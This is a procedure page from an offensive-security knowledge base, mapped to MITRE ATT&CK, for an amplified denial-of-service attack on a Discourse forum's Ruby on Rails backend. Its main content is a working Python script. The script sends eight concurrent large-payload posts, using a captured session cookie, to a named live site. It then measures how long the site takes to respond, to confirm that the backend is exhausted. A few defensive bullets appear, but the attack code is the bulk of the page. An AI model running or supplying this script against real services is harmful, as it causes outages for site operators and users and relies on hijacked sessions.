---
id: proc-uuid-5
tags:
  - automation
  - dos-amplification
  - web
type: procedure
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/python-discourse-dos-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:55.759Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Direct Network Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Automate-Concurrent-Requests-for-Amplified-DoS

## Summary

This procedure uses Python to send multiple parallel requests with the large payload, amplifying the DoS to affect the entire application and unrelated endpoints.

## Description

Automation scales the attack beyond manual efforts, overwhelming the Ruby on Rails backend. Scenario: Threaded HTTP requests to reply endpoint while monitoring /latest. Outcomes: Site-wide delays and downtime. Prerequisites: Session cookies and payload file.

## Requirements

1. Python 3 with requests library
2. Captured session cookies from authentication
3. Payload file downloaded
4. Access to monitor endpoint

## Defense

Defensive measures and detection strategies:

- Deploy WAF to detect and block concurrent large payloads
- Use resource quotas and auto-scaling for backend
- Alert on sudden spike in request volumes or sizes

## Objectives

1. Flood endpoint with 7-8 concurrent payloads
2. Observe impact on unrelated pages
3. Achieve application-level exhaustion

## Instructions

### Step 1: Prepare Script

**Context**: Set up the Python script with payload and session.

Download payload.txt and extract session cookie.

### Step 2: Execute Concurrent Requests

**Context**: Run the script to launch parallel attacks and monitor.

Execute [[commands/python-discourse-dos-script]]:

```python
import requests
import threading
import time

def send_payload():
    with open('payload.txt', 'r') as f:
        payload = f.read()
    data = {'post[raw]': payload}
    cookies = {'_forum_session': 'your_captured_session'}
    requests.post('https://try.discourse.org/t/welcome-to-discourse/1/posts', data=data, cookies=cookies)

threads = [threading.Thread(target=send_payload) for _ in range(8)]
for t in threads:
    t.start()
for t in threads:
    t.join()

start = time.time()
requests.get('https://try.discourse.org/latest')
print(f'/latest response time: {time.time() - start} seconds')
```

> Expected: ~30s delay on /latest vs. normal 1-2s, indicating exhaustion.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- [[Direct Network Flood]] HTTP Request Flood

## Commands Used

- [[commands/python-discourse-dos-script]]

## Tools Used

- [[tools/Python]]

## Tags

- automation
- dos-amplification
- web
